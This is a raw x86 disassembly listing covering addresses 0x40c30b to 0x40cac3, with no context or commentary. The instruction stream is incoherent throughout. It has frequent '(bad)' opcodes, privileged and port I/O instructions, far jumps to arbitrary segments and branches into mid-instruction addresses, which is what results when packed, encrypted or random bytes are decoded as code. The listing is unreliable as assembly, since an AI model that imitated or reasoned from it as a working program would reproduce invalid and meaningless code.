  40c30b:	pop    esi
  40c30c:	lds    ecx,FWORD PTR [edx+0x51]
  40c30f:	jmp    0x67c3:0xae807287
  40c316:	js     0x40c368
  40c318:	hlt    
  40c319:	out    dx,al
  40c31a:	add    eax,0x56cc02a3
  40c31f:	inc    BYTE PTR [ebp+0x69]
  40c322:	cmp    dl,BYTE PTR [edx+0x53]
  40c325:	push   esp
  40c326:	mov    dl,0xba
  40c328:	loop   0x40c34c
  40c32a:	data16 test BYTE PTR [esi],bl
  40c32d:	jns    0x40c3a8
  40c32f:	mov    dh,0x4c
  40c331:	mov    esp,0x65f8e352
  40c336:	jae    0x40c35a
  40c338:	inc    edx
  40c339:	xchg   ebx,eax
  40c33a:	dec    ebx
  40c33b:	adc    al,0x14
  40c33d:	ins    DWORD PTR es:[edi],dx
  40c33e:	push   ds
  40c33f:	jp     0x40c37d
  40c341:	fmul   QWORD PTR [ecx-0x15720d25]
  40c347:	xor    DWORD PTR [edx+0x24943b45],ebx
  40c34d:	mov    al,0xcd
  40c34f:	and    al,0x6c
  40c351:	cmovge edx,ebp
  40c354:	in     eax,0xb
  40c356:	test   BYTE PTR [ebp+0x109503a],bl
  40c35c:	mov    ebx,0x1e892929
  40c361:	loope  0x40c387
  40c363:	mov    cl,0x70
  40c365:	dec    edi
  40c366:	mov    ebx,0xb5237ab3
  40c36b:	out    dx,al
  40c36c:	lds    edx,FWORD PTR [ebp-0x68bff1d1]
  40c372:	or     bl,BYTE PTR [esi]
  40c374:	add    DWORD PTR [ebx+0x69],esi
  40c377:	mul    BYTE PTR [ebp-0x38eba9fe]
  40c37d:	or     al,BYTE PTR [ebx+0xc0090ae]
  40c383:	xchg   ebx,eax
  40c384:	enter  0x14d9,0x8a
  40c388:	mov    ebp,0x617a30b3
  40c38d:	rol    DWORD PTR [esi+0x15],cl
  40c390:	fwait
  40c391:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c392:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c393:	into   
  40c394:	jp     0x40c3cc
  40c396:	mov    ch,0x2a
  40c398:	and    DWORD PTR [esi-0x7ffbd6c7],ebx
  40c39e:	sbb    di,WORD PTR [esi+0x34e8ab4d]
  40c3a5:	in     eax,0xbc
  40c3a7:	call   DWORD PTR [edi+0x4e]
  40c3aa:	ds pop ds
  40c3ac:	xchg   esp,eax
  40c3ad:	cwde   
  40c3ae:	fistp  QWORD PTR [ebp+0x75d7850]
  40c3b4:	adc    BYTE PTR [esi+0x5cd38224],dl
  40c3ba:	adc    ch,BYTE PTR [edx]
  40c3bc:	mov    esp,0x628d8d6d
  40c3c1:	(bad)  
  40c3c2:	call   0x886a39d
  40c3c7:	repz dec esp
  40c3c9:	pop    ds
  40c3ca:	test   BYTE PTR [edi],0xb7
  40c3cd:	shr    ah,0x31
  40c3d0:	call   DWORD PTR ds:0x6f44a502
  40c3d6:	mov    ebx,0xd8889079
  40c3db:	sbb    ecx,0x34afe00f
  40c3e1:	test   eax,0x67888970
  40c3e6:	out    0xe0,al
  40c3e8:	mov    ah,0x53
  40c3ea:	ins    BYTE PTR es:[edi],dx
  40c3eb:	sub    eax,0xb088689e
  40c3f0:	mov    al,ch
  40c3f2:	pop    edi
  40c3f3:	mov    ah,BYTE PTR [edi-0x7a]
  40c3f6:	adc    al,0x81
  40c3f8:	test   DWORD PTR [ebx+esi*8],edi
  40c3fb:	retf   0x65a1
  40c3fe:	mov    eax,ds:0x1c839c6
  40c403:	sbb    DWORD PTR [esi],ebx
  40c405:	sbb    eax,0xc9b78a33
  40c40a:	mov    edi,0x26b0d82
  40c40f:	in     al,0xf
  40c411:	jge    0x40c45b
  40c413:	popf   
  40c414:	int    0x4c
  40c416:	or     eax,0x29390480
  40c41b:	pop    ebx
  40c41c:	pop    ss
  40c41d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c41e:	cld    
  40c41f:	sub    BYTE PTR [eax+0x4d],0xe3
  40c423:	int    0x9b
  40c425:	leave  
  40c426:	pop    ds
  40c427:	xchg   ebp,eax
  40c428:	pusha  
  40c429:	and    al,bl
  40c42b:	gs dec esp
  40c42d:	gs jmp 0x5713:0x40e76144
  40c435:	(bad)  
  40c436:	sbb    eax,0xd2a436b3
  40c43b:	ins    BYTE PTR es:[edi],dx
  40c43c:	add    al,BYTE PTR [ebp-0x4a]
  40c43f:	inc    ebp
  40c440:	adc    al,0xc7
  40c442:	inc    esp
  40c443:	lods   eax,DWORD PTR ds:[esi]
  40c444:	(bad)  
  40c445:	imul   ebx,DWORD PTR [ecx-0x53],0xffffffb3
  40c449:	adc    edx,DWORD PTR [edx+0x4]
  40c44c:	jno    0x40c42d
  40c44e:	and    eax,DWORD PTR [edi]
  40c450:	shl    DWORD PTR [ebx+0x35],cl
  40c453:	iret   
  40c454:	xchg   DWORD PTR [ebp+0x45f0e815],eax
  40c45a:	dec    esi
  40c45b:	jmp    0x40c43a
  40c45d:	cld    
  40c45e:	int    0x20
  40c460:	xor    eax,0x969b5541
  40c465:	imul   DWORD PTR [edx]
  40c467:	and    BYTE PTR [ecx+0x5c56adda],al
  40c46d:	adc    BYTE PTR [ecx],0x71
  40c470:	retf   0xbaba
  40c473:	out    dx,eax
  40c474:	xchg   BYTE PTR [edx+ebx*8+0x5c],ch
  40c478:	add    eax,0xd2dfbd9
  40c47d:	daa    
  40c47e:	adc    esp,DWORD PTR ds:0x9c9a8337
  40c484:	sbb    edi,ecx
  40c486:	cwde   
  40c487:	sub    DWORD PTR [eax],edi
  40c489:	aad    0xe5
  40c48b:	fcom   st(2)
  40c48d:	in     al,dx
  40c48e:	adc    al,0x2
  40c490:	jae    0x40c50f
  40c492:	(bad)  
  40c493:	pop    ecx
  40c494:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c495:	inc    edi
  40c496:	pushf  
  40c497:	fidivr WORD PTR [esi-0x2ab6cf1e]
  40c49d:	mov    ecx,0xdd7034f8
  40c4a2:	jnp    0x40c4db
  40c4a4:	pop    ecx
  40c4a5:	cdq    
  40c4a6:	sar    ebp,cl
  40c4a8:	jl     0x40c43b
  40c4aa:	daa    
  40c4ab:	loopne 0x40c456
  40c4ad:	pop    ds
  40c4ae:	popa   
  40c4af:	ds out 0x39,eax
  40c4b2:	inc    esp
  40c4b3:	pop    ss
  40c4b4:	out    0xcb,eax
  40c4b6:	jae    0x40c4ca
  40c4b8:	dec    ax
  40c4ba:	jns    0x40c453
  40c4bc:	adc    eax,DWORD PTR [edi-0x5e5ea6c0]
  40c4c2:	addr16 hlt 
  40c4c4:	and    eax,0xd25e0628
  40c4c9:	sbb    eax,0x3ecc62fa
  40c4ce:	or     al,0xd
  40c4d0:	enter  0xc6fb,0x7e
  40c4d4:	mov    ah,0x23
  40c4d6:	push   ebx
  40c4d7:	aas    
  40c4d8:	(bad)  [edx+0x79]
  40c4db:	lea    ebp,[ebx]
  40c4dd:	or     BYTE PTR [ebp+0x35dc47a1],cl
  40c4e3:	shl    ebx,1
  40c4e5:	and    esi,DWORD PTR [esi+0x5f]
  40c4e8:	mov    dl,0x40
  40c4ea:	sbb    ah,BYTE PTR [edx+eiz*1]
  40c4ed:	mov    esp,0xd77ffc9d
  40c4f2:	jl     0x40c4d7
  40c4f4:	mov    bl,dh
  40c4f6:	inc    BYTE PTR [ebx+eiz*8]
  40c4f9:	cmc    
  40c4fa:	aam    0x2a
  40c4fc:	inc    ebp
  40c4fd:	push   ecx
  40c4fe:	stos   DWORD PTR es:[edi],eax
  40c4ff:	inc    esi
  40c500:	push   0xa5635cf4
  40c505:	and    cl,0x49
  40c508:	scas   al,BYTE PTR es:[edi]
  40c509:	jae    0x40c51d
  40c50b:	mov    WORD PTR [esp+edi*2+0x1bd5b9f6],?
  40c512:	push   ss
  40c513:	out    dx,al
  40c514:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c515:	mov    ecx,0x41a7e813
  40c51a:	mov    ah,al
  40c51c:	in     al,0x84
  40c51e:	aad    0x50
  40c520:	adc    eax,0x752e0684
  40c525:	and    al,0x44
  40c527:	call   DWORD PTR [ecx]
  40c529:	nop
  40c52a:	mov    ch,0x75
  40c52c:	mov    ?,WORD PTR [bx+si]
  40c52f:	lahf   
  40c530:	and    DWORD PTR [ebp+edi*2+0x17],edi
  40c534:	or     BYTE PTR [edx-0x31b94d7e],bl
  40c53a:	xor    BYTE PTR [ebp-0x773ec5ff],ah
  40c540:	jne    0x40c502
  40c542:	cmp    al,0x7f
  40c544:	inc    eax
  40c545:	in     eax,0xb7
  40c547:	and    BYTE PTR [ebx+eax*4+0x45563884],al
  40c54e:	loope  0x40c55f
  40c550:	mov    edx,0x3c023575
  40c555:	call   0xa0b4:0xde49169b
  40c55c:	jo     0x40c576
  40c55e:	fwait
  40c55f:	jecxz  0x40c5a2
  40c561:	adc    BYTE PTR [ecx-0x57],al
  40c564:	fucomi st,st(2)
  40c566:	aad    0x38
  40c568:	xchg   esp,eax
  40c569:	sbb    DWORD PTR [ebx+eax*8-0x381a031f],esi
  40c570:	mov    bh,0x1a
  40c572:	sbb    al,0x32
  40c574:	inc    ebp
  40c575:	stos   DWORD PTR es:[edi],eax
  40c576:	xchg   edi,eax
  40c577:	call   0x68414020
  40c57c:	add    eax,0x981166d8
  40c581:	retf   
  40c582:	pop    ecx
  40c583:	out    0xb6,eax
  40c585:	and    eax,0x146f9d3b
  40c58a:	cdq    
  40c58b:	(bad)  
  40c58c:	mov    bh,0xa
  40c58e:	sbb    esi,edi
  40c590:	jno    0x40c53b
  40c592:	sbb    al,0x2e
  40c594:	adc    eax,0xe4695085
  40c599:	adc    dh,BYTE PTR [ebp+ebp*1+0x383d3a25]
  40c5a0:	mov    BYTE PTR [esp+ebp*8-0x7d],cl
  40c5a4:	jb     0x40c543
  40c5a6:	aaa    
  40c5a7:	(bad)  
  40c5a8:	adc    DWORD PTR [edx-0x22489cdc],ecx
  40c5ae:	mov    edx,0xbe31f322
  40c5b3:	stos   BYTE PTR es:[edi],al
  40c5b4:	je     0x40c556
  40c5b6:	inc    DWORD PTR [ebp-0x2c]
  40c5b9:	jge    0x40c5b7
  40c5bb:	aas    
  40c5bc:	push   ebp
  40c5bd:	in     al,dx
  40c5be:	adc    BYTE PTR [edi+eiz*2-0x63],0x89
  40c5c3:	and    BYTE PTR [esi+0x6e01879e],dl
  40c5c9:	cmp    al,0x12
  40c5cb:	mov    WORD PTR ds:0xd1503b95,ds
  40c5d1:	addr16 jp 0x40c57a
  40c5d4:	sbb    al,0x74
  40c5d6:	and    BYTE PTR [ebp+0x63a1d91d],dh
  40c5dc:	cs ins DWORD PTR es:[edi],dx
  40c5de:	or     BYTE PTR [eax],al
  40c5e0:	in     eax,0x61
  40c5e2:	in     al,dx
  40c5e3:	sub    BYTE PTR [ecx],bl
  40c5e5:	cmp    esi,0x7a9ecc7c
  40c5eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5ec:	das    
  40c5ed:	mov    WORD PTR [eax-0x1e940cdc],?
  40c5f3:	pusha  
  40c5f4:	xchg   BYTE PTR [edx+0x46],ch
  40c5f7:	adc    DWORD PTR [ebp-0x2dafd8ba],esi
  40c5fd:	imul   edi,DWORD PTR [ebp+0x339c5549],0xffffffc5
  40c604:	xchg   ecx,eax
  40c605:	fmul   DWORD PTR es:[edx+0x68]
  40c609:	(bad)  
  40c60a:	(bad)  
  40c60b:	int3   
  40c60c:	jno    0x40c5db
  40c60e:	neg    DWORD PTR [edx+eiz*1]
  40c611:	and    eax,0xffffffdd
  40c614:	adc    ebp,DWORD PTR [eax+esi*1+0x7c8665b3]
  40c61b:	push   edx
  40c61c:	mov    bh,0xb9
  40c61e:	int    0x3b
  40c620:	frstor [edx+esi*8-0x5f]
  40c624:	and    bl,BYTE PTR [ecx]
  40c626:	scas   eax,DWORD PTR es:[edi]
  40c627:	(bad)  
  40c628:	dec    esp
  40c629:	arpl   WORD PTR [ebx],bp
  40c62b:	pop    ss
  40c62c:	jnp    0x40c69b
  40c62e:	jno    0x40c652
  40c630:	inc    ecx
  40c631:	xor    ecx,eax
  40c633:	push   ss
  40c634:	or     BYTE PTR [edi+0x62],ch
  40c637:	arpl   WORD PTR [eax],bp
  40c639:	mov    ch,0x8d
  40c63b:	cwde   
  40c63c:	sub    BYTE PTR [esi+0x50eb6c2d],bl
  40c642:	test   eax,0x6bbd380b
  40c647:	lods   eax,DWORD PTR ds:[esi]
  40c648:	mov    es,WORD PTR [edx+0x50]
  40c64b:	call   0x98f6:0x6e201317
  40c652:	add    eax,0xcc71bcd8
  40c657:	push   es
  40c658:	popa   
  40c659:	mov    al,0x17
  40c65b:	pop    esi
  40c65c:	mov    ah,0x47
  40c65e:	adc    eax,0xb28c6bd3
  40c663:	adc    al,0xe2
  40c665:	jae    0x40c668
  40c667:	jp     0x40c6c7
  40c669:	push   0xf967ccd8
  40c66e:	push   ecx
  40c66f:	sbb    DWORD PTR [esi-0x3baa335b],0xea23edd0
  40c679:	xor    bl,BYTE PTR ds:0xab043764
  40c67f:	cmp    ebx,esi
  40c681:	lahf   
  40c682:	mov    al,0xa7
  40c684:	xchg   edx,eax
  40c685:	test   BYTE PTR [ebx+0x6],dl
  40c688:	pop    ds
  40c689:	stos   DWORD PTR es:[edi],eax
  40c68a:	cmc    
  40c68b:	shl    DWORD PTR [edx],1
  40c68d:	cmp    eax,ebp
  40c68f:	mov    ah,0x4
  40c691:	stc    
  40c692:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c693:	test   eax,0x70c037e7
  40c698:	xor    ah,BYTE PTR [ebp-0x7b71b73a]
  40c69e:	arpl   WORD PTR [edi],dx
  40c6a0:	in     eax,dx
  40c6a1:	(bad)
  40c6a4:	hlt    
  40c6a5:	mov    cl,0x81
  40c6a7:	rcr    BYTE PTR [eax-0x8],1
  40c6aa:	sbb    ebp,DWORD PTR [ebp-0x46]
  40c6ad:	repz or BYTE PTR [esi-0x5c],0x87
  40c6b2:	ror    ecx,0x5a
  40c6b5:	and    ecx,DWORD PTR [ebx+ebp*1]
  40c6b8:	idiv   BYTE PTR ds:0xa78886f1
  40c6be:	fisubr WORD PTR cs:[ebx+0x42]
  40c6c2:	jmp    0x16ca4d44
  40c6c7:	cdq    
  40c6c8:	or     dl,BYTE PTR [edi]
  40c6ca:	test   eax,0xa1972766
  40c6cf:	mov    ch,0x22
  40c6d1:	aaa    
  40c6d2:	(bad)  
  40c6d4:	pop    esp
  40c6d5:	jae    0x40c720
  40c6d7:	inc    ebp
  40c6d8:	jge    0x40c718
  40c6da:	adc    dl,0x3b
  40c6dd:	mov    al,0x7a
  40c6df:	in     al,0x16
  40c6e1:	call   0xc780:0x73084374
  40c6e8:	stos   BYTE PTR es:[edi],al
  40c6e9:	test   DWORD PTR [eax-0x5701672d],0xfeb86eaf
  40c6f3:	out    0x82,eax
  40c6f5:	xlat   BYTE PTR ds:[ebx]
  40c6f6:	and    al,0xa3
  40c6f8:	xchg   ebx,eax
  40c6f9:	clc    
  40c6fa:	push   eax
  40c6fb:	jbe    0x40c6c2
  40c6fd:	push   0x57
  40c6ff:	add    al,0x1d
  40c701:	push   0xbf8408f9
  40c706:	and    esi,DWORD PTR [esi+eiz*1]
  40c709:	sub    DWORD PTR ds:[esi+ebp*4+0x585cd550],esi
  40c711:	nop    DWORD PTR [eax-0x59f3100f]
  40c718:	(bad)  
  40c71a:	mov    bl,0x0
  40c71c:	not    DWORD PTR ds:0xea9576ee
  40c722:	sub    bh,BYTE PTR [edi]
  40c724:	enter  0x8fc9,0xf6
  40c728:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c729:	in     eax,dx
  40c72a:	adc    dh,BYTE PTR [edx+0x32]
  40c72d:	lahf   
  40c72e:	popf   
  40c72f:	add    bl,dl
  40c731:	mov    cl,0x97
  40c733:	dec    esp
  40c734:	fwait
  40c735:	jno    0x40c6fa
  40c737:	and    eax,0xe5b997ca
  40c73c:	leave  
  40c73d:	inc    esi
  40c73e:	lock sbb al,0x74
  40c741:	fst    DWORD PTR [eax+0x28]
  40c744:	cmovbe ebp,DWORD PTR [edi-0x1e02cffa]
  40c74b:	adc    eax,0xd4870c19
  40c750:	inc    eax
  40c751:	or     BYTE PTR [ecx-0xd892cbf],bh
  40c757:	or     ecx,ebp
  40c759:	test   DWORD PTR [ecx],0x382ed150
  40c75f:	mov    bh,BYTE PTR [edi-0x61b7aae9]
  40c765:	in     al,0x31
  40c767:	arpl   WORD PTR [esi-0x10],bx
  40c76a:	xchg   ecx,eax
  40c76b:	jbe    0x40c795
  40c76d:	mov    DWORD PTR [ecx-0x5e228d90],ebx
  40c773:	call   FWORD PTR [ebx-0x74368da9]
  40c779:	xor    ch,BYTE PTR [ebp-0x7a]
  40c77c:	sbb    BYTE PTR ds:0xddccd5a9,ch
  40c782:	sub    bh,BYTE PTR [edi-0x4cd2a150]
  40c788:	not    BYTE PTR [edx]
  40c78a:	js     0x40c778
  40c78c:	in     eax,0xc1
  40c78e:	or     esp,DWORD PTR [eax+0x68]
  40c791:	pop    ss
  40c792:	push   0xffffffa2
  40c794:	xor    BYTE PTR [edi-0x7a],cl
  40c797:	out    0xae,eax
  40c799:	and    al,0xfe
  40c79b:	popa   
  40c79c:	test   BYTE PTR [esi+ecx*4+0x1c242b1b],bh
  40c7a3:	mov    bl,0x9a
  40c7a5:	and    cl,al
  40c7a7:	lds    esi,FWORD PTR [esp+0x56e7fc99]
  40c7ae:	cmp    esp,esi
  40c7b0:	mov    al,0x80
  40c7b2:	mov    DWORD PTR [eax-0x79],esp
  40c7b5:	ins    DWORD PTR es:[edi],dx
  40c7b6:	outs   dx,DWORD PTR ds:[esi]
  40c7b7:	lock pop ds
  40c7b9:	jl     0x40c82a
  40c7bb:	aas    
  40c7bc:	aam    0x5
  40c7be:	nop
  40c7bf:	iret   
  40c7c0:	lock repnz dec edx
  40c7c3:	xchg   esi,eax
  40c7c4:	fstp   TBYTE PTR [esi+0x3e]
  40c7c7:	sub    eax,0x51d50a4c
  40c7cc:	jg     0x40c7cd
  40c7ce:	ja     0x40c7f0
  40c7d0:	jmp    0x2ca8:0x4398cef0
  40c7d7:	test   BYTE PTR [ebx],ah
  40c7d9:	xor    eax,0x992cfe45
  40c7de:	and    al,0x10
  40c7e0:	mov    al,0xc7
  40c7e2:	retf   0xd341
  40c7e5:	and    eax,0x864a4a0a
  40c7ea:	push   es
  40c7eb:	bound  ecx,QWORD PTR [edx+0x4b]
  40c7ee:	mov    edi,0x2e173052
  40c7f3:	xchg   esp,eax
  40c7f4:	les    edi,FWORD PTR [esi-0x16]
  40c7f7:	push   0x4eb2ab2
  40c7fc:	add    bl,BYTE PTR [edi]
  40c7fe:	mov    al,ds:0xfeb0ea34
  40c803:	in     al,0xe0
  40c805:	mov    al,ds:0x139296e1
  40c80a:	(bad)  
  40c80b:	retf   0x712a
  40c80e:	into   
  40c80f:	test   al,0x30
  40c811:	shl    BYTE PTR [eax-0xdf7e6e4],0xc3
  40c818:	push   cs
  40c819:	or     DWORD PTR [ebx+eiz*4-0x201fe494],eax
  40c820:	mov    ds:0x75fdc966,al
  40c825:	imul   edx,DWORD PTR [edx],0xeef05a87
  40c82b:	jge    0x40c83a
  40c82d:	dec    esp
  40c82e:	push   esp
  40c82f:	inc    eax
  40c830:	lods   eax,DWORD PTR ds:[esi]
  40c831:	pop    ebp
  40c832:	fcmovbe st,st(1)
  40c834:	xchg   ebx,eax
  40c835:	rcl    DWORD PTR [eax-0x2e],0x4c
  40c839:	mov    ds:0xd53d0e3d,al
  40c83e:	push   ds
  40c83f:	call   0xb2e:0x57693238
  40c846:	mov    dh,0xc8
  40c848:	ds lahf 
  40c84a:	mov    esp,0x504680a7
  40c84f:	adc    DWORD PTR [edi+0x74015fd],eax
  40c855:	inc    esp
  40c856:	inc    edx
  40c857:	(bad)  [edi]
  40c859:	mov    BYTE PTR [ebx-0x2c11b6fe],0x31
  40c860:	mov    al,ds:0x428a6d7f
  40c865:	and    DWORD PTR [ebx],ebx
  40c867:	test   al,0xd7
  40c869:	or     ch,BYTE PTR [ecx-0x6f]
  40c86c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c86d:	mov    BYTE PTR [edi-0x59],cl
  40c870:	aam    0x80
  40c872:	dec    edx
  40c873:	jg     0x40c8f4
  40c875:	lods   eax,DWORD PTR ds:[esi]
  40c876:	sub    BYTE PTR [ecx+0x2f],dh
  40c879:	scas   al,BYTE PTR es:[edi]
  40c87a:	push   eax
  40c87b:	rcr    DWORD PTR [eax],cl
  40c87d:	and    eax,0xa1aa399b
  40c882:	stos   DWORD PTR es:[edi],eax
  40c883:	mov    DWORD PTR [eax],edx
  40c885:	jnp    0x40c80d
  40c887:	jecxz  0x40c862
  40c889:	in     eax,0xa7
  40c88b:	xchg   edx,eax
  40c88c:	pop    ebp
  40c88d:	mov    ebp,0x6c29dc6f
  40c892:	inc    edx
  40c893:	jmp    0x40c8dd
  40c895:	mov    al,0xff
  40c897:	push   0xffffffe9
  40c899:	shr    DWORD PTR [ebp+edx*8-0x27becf4f],cl
  40c8a0:	shl    DWORD PTR [edx+0x563970],1
  40c8a6:	cmp    ecx,ecx
  40c8a8:	fcomp  QWORD PTR [eax+0x25213860]
  40c8ae:	stos   BYTE PTR es:[edi],al
  40c8af:	dec    DWORD PTR [ecx-0x731da15c]
  40c8b5:	js     0x40c8d9
  40c8b7:	mov    bl,0x95
  40c8b9:	push   ebp
  40c8ba:	sub    BYTE PTR [eax+0x51186424],dh
  40c8c0:	jo     0x40c8e2
  40c8c2:	cdq    
  40c8c3:	push   cs
  40c8c4:	stos   DWORD PTR es:[edi],eax
  40c8c5:	fist   DWORD PTR [edi+eiz*8]
  40c8c8:	inc    eax
  40c8c9:	aad    0x2a
  40c8cb:	retf   
  40c8cc:	fimul  DWORD PTR ss:[edi-0x64ab3611]
  40c8d3:	repz sbb DWORD PTR [edi-0x67],edi
  40c8d7:	push   ds
  40c8d8:	mov    edi,cr3
  40c8db:	mov    eax,DWORD PTR [ecx]
  40c8dd:	and    eax,0xc63f7a66
  40c8e2:	jo     0x40c95f
  40c8e4:	push   cs
  40c8e5:	popf   
  40c8e6:	xlat   BYTE PTR ds:[ebx]
  40c8e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8e8:	neg    BYTE PTR [ebx]
  40c8ea:	mov    ah,0x3b
  40c8ec:	mov    edx,ebx
  40c8ee:	xor    BYTE PTR [edi],bh
  40c8f0:	fndisi(8087 only) 
  40c8f2:	dec    edx
  40c8f3:	pusha  
  40c8f4:	rcl    BYTE PTR [ebx+0x6f5d8d54],0xae
  40c8fb:	fstp   QWORD PTR [edx]
  40c8fd:	rcl    BYTE PTR [eax+0x6d50b8b3],1
  40c903:	fwait
  40c904:	mov    bh,0xca
  40c906:	enter  0x443a,0x7f
  40c90a:	(bad)  
  40c90b:	(bad)  
  40c90c:	scas   al,BYTE PTR es:[edi]
  40c90d:	sahf   
  40c90e:	and    ch,0x72
  40c911:	mov    edx,0xa07dca08
  40c916:	xor    ch,BYTE PTR [ecx+0x10]
  40c919:	dec    esp
  40c91a:	push   esp
  40c91b:	pusha  
  40c91c:	les    esi,FWORD PTR [ebp+0x24e2285c]
  40c922:	scas   eax,DWORD PTR es:[edi]
  40c923:	stos   DWORD PTR es:[edi],eax
  40c924:	loopne 0x40c993
  40c926:	imul   esi,eax,0xffffffc3
  40c929:	out    dx,al
  40c92a:	add    cl,ch
  40c92c:	loopne 0x40c942
  40c92e:	rcl    DWORD PTR [ebx+0x710411d8],1
  40c934:	aas    
  40c935:	add    DWORD PTR [ebx],edx
  40c937:	mov    ch,0xdd
  40c939:	jo     0x40c8da
  40c93b:	(bad)  
  40c93c:	cvtps2pi mm2,xmm0
  40c93f:	ss pop esi
  40c941:	mov    bh,0x5d
  40c943:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c944:	push   cs
  40c945:	xor    DWORD PTR [edx],ecx
  40c947:	scas   eax,DWORD PTR es:[edi]
  40c948:	xor    BYTE PTR [ebx],ah
  40c94a:	out    0x83,eax
  40c94c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c94d:	pop    edx
  40c94e:	mov    dl,dl
  40c950:	loope  0x40c979
  40c952:	bound  edi,QWORD PTR [ebp+ebx*8+0x2b]
  40c956:	lock not DWORD PTR [edi+eiz*8]
  40c95a:	(bad)  
  40c95b:	pop    ds
  40c95c:	mov    al,ds:0x46447dc1
  40c961:	test   DWORD PTR [edx-0x198fef4c],0xe4d3e537
  40c96b:	pop    ebx
  40c96c:	test   DWORD PTR [ebx-0x53],edi
  40c96f:	or     al,0x52
  40c971:	aam    0x95
  40c973:	stc    
  40c974:	mov    bh,0xfd
  40c976:	cmp    eax,0x7e3781a4
  40c97b:	ss iret 
  40c97d:	push   edi
  40c97e:	outs   dx,BYTE PTR ds:[esi]
  40c97f:	inc    edx
  40c980:	mov    DWORD PTR [edx-0x66],ecx
  40c983:	pop    ecx
  40c984:	jg     0x40c9d7
  40c986:	out    dx,eax
  40c987:	sub    eax,0x2871ead0
  40c98c:	dec    esi
  40c98d:	daa    
  40c98e:	inc    edi
  40c98f:	nop
  40c990:	mov    eax,0x8e4f7bf6
  40c995:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c996:	cdq    
  40c997:	repnz xor edx,DWORD PTR [edi]
  40c99a:	mov    ebx,0xee43f162
  40c99f:	nop
  40c9a0:	jb     0x40c9e9
  40c9a2:	cmp    DWORD PTR fs:[esp+eiz*8],eax
  40c9a6:	or     al,0xe0
  40c9a8:	or     eax,0x8a9ad20b
  40c9ad:	push   0x8acddf83
  40c9b2:	int3   
  40c9b3:	mov    edx,0xf44c0786
  40c9b8:	jnp    0x40c98e
  40c9ba:	test   eax,0x324bf812
  40c9bf:	cmp    ebx,ecx
  40c9c1:	jle    0x40c9c2
  40c9c3:	clc    
  40c9c4:	imul   edx,DWORD PTR [edx+0x58459522],0x71d7eb3a
  40c9ce:	jecxz  0x40ca48
  40c9d0:	mov    ch,ch
  40c9d2:	mov    DWORD PTR [edx+esi*1+0x2a],edx
  40c9d6:	adc    ecx,DWORD PTR [ecx-0x15d1a13e]
  40c9dc:	loopne 0x40c9af
  40c9de:	neg    BYTE PTR [eax]
  40c9e0:	imul   esi,DWORD PTR [eax-0x20],0xba3f3d09
  40c9e7:	aam    0x45
  40c9e9:	aas    
  40c9ea:	or     dh,cl
  40c9ec:	push   ds
  40c9ed:	scas   al,BYTE PTR es:[edi]
  40c9ee:	xchg   ecx,eax
  40c9ef:	or     eax,0xc9502eba
  40c9f4:	mov    esp,0x9617e894
  40c9f9:	jle    0x40ca17
  40c9fb:	cmp    eax,0x7c4c0c72
  40ca00:	push   0x7b8e0f62
  40ca05:	add    DWORD PTR [esp+ebx*8],eax
  40ca08:	mov    dl,0x9b
  40ca0a:	repz pop eax
  40ca0c:	pop    es
  40ca0d:	push   DWORD PTR [ecx]
  40ca0f:	mov    ebx,cs
  40ca11:	pop    ebp
  40ca12:	inc    esi
  40ca13:	sbb    BYTE PTR [ecx+eax*8-0x56],0x70
  40ca18:	mov    ds:0x9fdccb04,eax
  40ca1d:	mov    ebp,0xcfe05679
  40ca22:	dec    eax
  40ca23:	pop    esi
  40ca24:	(bad)  
  40ca25:	push   ss
  40ca26:	shl    ecx,cl
  40ca28:	shl    DWORD PTR [ecx],cl
  40ca2a:	push   0xbd6a1d35
  40ca2f:	xor    eax,0x4b382984
  40ca34:	cmc    
  40ca35:	fimul  DWORD PTR [edi-0x1fb2fd91]
  40ca3b:	sar    DWORD PTR [ebx],cl
  40ca3d:	sti    
  40ca3e:	and    BYTE PTR [edx+0x6b0097d1],0x4a
  40ca45:	mov    esp,0x18348fe9
  40ca4a:	inc    esi
  40ca4b:	push   ds
  40ca4c:	mov    esp,0x6c27a65e
  40ca51:	sbb    eax,esp
  40ca53:	mov    bl,BYTE PTR [ecx]
  40ca55:	je     0x40ca73
  40ca57:	mov    esp,0xaa8654a8
  40ca5c:	lods   al,BYTE PTR ds:[esi]
  40ca5d:	jg     0x40ca12
  40ca5f:	mov    esp,0xec3436ab
  40ca64:	test   al,0x84
  40ca66:	imul   bl
  40ca68:	ror    DWORD PTR [ebx+ebx*8-0x9],0x5a
  40ca6d:	cmp    eax,0x66367e5
  40ca72:	sahf   
  40ca73:	shl    DWORD PTR [ecx+0x74],0x52
  40ca77:	dec    esi
  40ca78:	clc    
  40ca79:	pop    ds
  40ca7a:	jae    0x40cabe
  40ca7c:	jmp    0x5197:0xb044bf65
  40ca83:	(bad)  
  40ca84:	mov    bl,0x49
  40ca86:	ret    
  40ca87:	dec    esp
  40ca88:	jo     0x40cace
  40ca8a:	jl     0x40cac7
  40ca8c:	pop    edi
  40ca8d:	pop    ss
  40ca8e:	pop    ecx
  40ca8f:	imul   edi,DWORD PTR [ecx-0x1686d119],0x7c
  40ca96:	cld    
  40ca97:	idiv   DWORD PTR [esi+0x5c]
  40ca9a:	xor    al,0x2e
  40ca9c:	jns    0x40caeb
  40ca9e:	mov    BYTE PTR [eax+0x68],dl
  40caa1:	adc    ch,BYTE PTR [edx-0x56]
  40caa4:	int    0x6d
  40caa6:	adc    edx,DWORD PTR [ebp+0x65523932]
  40caac:	gs es cld 
  40caaf:	in     al,0x7e
  40cab1:	inc    eax
  40cab2:	mov    cl,0x86
  40cab4:	pop    ecx
  40cab5:	cwde   
  40cab6:	gs mov ebp,0xc46f8dbc
  40cabc:	les    esp,FWORD PTR [ebx+esi*2-0x5]
  40cac0:	and    ebx,ecx
  40cac2:	xchg   edx,eax
  40cac3:	cmp    dh,ah
